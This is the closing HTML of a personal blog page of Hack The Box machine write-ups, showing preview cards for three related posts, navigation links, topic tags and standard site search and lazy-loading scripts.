Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/writeup-htb/"><div class="card-body"> <span class="timeago small" > Oct 13, 2019 <i class="unloaded">2019-10-13T15:35:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Writeup</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! $ ech...</p></div></div></a></div><div class="card"> <a href="/posts/haystack-htb/"><div class="card-body"> <span class="timeago small" > Nov 3, 2019 <i class="unloaded">2019-11-03T18:38:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Haystack</h3><div class="text-muted small"><p> I really felt that this machine resonated with me because of the Elastic Stack components running on it and I happened to be learning about them at that point of time XD Configuration The opera...</p></div></div></a></div><div class="card"> <a href="/posts/postman-htb/"><div class="card-body"> <span class="timeago small" > Mar 15, 2020 <i class="unloaded">2020-03-15T11:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Postman</h3><div class="text-muted small"><p> Despite the name of this box, it was nowhere related to Postman! This box was quite weird as I actually jumped straight to root instead of going to user first. Configuration The operating syste...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/openadmin-htb/" class="btn btn-outline-primary"><p>Hack The Box - OpenAdmin</p></a> <a href="/posts/sauna-htb/" class="btn btn-outline-primary"><p>Hack The Box - Sauna</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
